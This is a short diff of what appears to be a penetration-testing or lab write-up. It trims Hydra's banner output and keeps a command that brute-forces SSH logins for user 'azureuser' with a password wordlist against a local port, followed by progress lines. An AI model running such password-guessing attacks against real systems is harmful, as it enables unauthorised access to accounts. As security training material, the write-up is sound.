@@ -145,11 +145,7 @@ $ hydra -l azureuser -P /opt/wordlists/passwords.txt ssh://127.0.0.1:2222
 
 ```bash
 $ hydra -l azureuser -P /opt/wordlists/passwords.txt ssh://127.0.0.1:2222
-Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-28 06:48:54
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999), ~63 tries per task
+...[snip]...
 [DATA] attacking ssh://127.0.0.1:2222/
 [STATUS] 145.00 tries/min, 145 tries in 00:01h, 855 to do in 00:06h, 16 active
 ```
